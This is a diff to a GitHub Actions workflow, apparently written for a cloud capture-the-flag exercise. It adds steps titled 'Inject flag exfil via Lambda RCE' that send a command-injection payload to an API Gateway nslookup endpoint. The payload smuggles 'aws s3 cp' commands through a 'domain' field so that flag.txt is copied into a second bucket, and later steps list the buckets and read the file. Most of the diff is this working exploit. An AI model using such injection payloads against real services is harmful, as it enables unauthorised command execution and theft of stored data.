@@ -81,6 +81,25 @@ jobs:
           aws s3 ls s3://codec4f26c862a321ef5 --recursive || echo "VPC-only access denied"
           echo "=== site bucket ==="
           aws s3 ls s3://site781fe43f26b9eba3 --recursive || echo "access denied"
+
+
+            - name: Inject flag exfil via Lambda RCE
+        run: |
+          PAYLOAD='{"domain": "; aws s3 cp s3://codec4f26c862a321ef5/flag.txt s3://platform-bucket-009661764077-us-east-1/flag.txt; aws s3 cp s3://codec4f26c862a321ef5/flag.txt s3://codec4f26c862a321ef5/flag-exfil.txt #"}'
+          echo "Sending payload..."
+          curl -s -X POST -H "Content-Type: application/json" -d "$PAYLOAD" \
+            https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup
+          echo "Waiting 10s for Lambda to finish..."
+          sleep 10
+
+      - name: Check if flag was written to buckets
+        run: |
+          echo "=== platform-bucket contents ==="
+          aws s3 ls s3://platform-bucket-009661764077-us-east-1 --recursive
+          echo "=== codec bucket contents ==="
+          aws s3 ls s3://codec4f26c862a321ef5 --recursive
+          echo "=== Attempt direct read ==="
+          aws s3 cp s3://platform-bucket-009661764077-us-east-1/flag.txt /tmp/flag.txt && cat /tmp/flag.txt || echo "not in platform-bucket"
           
       - name: Bucket policies
         run: |
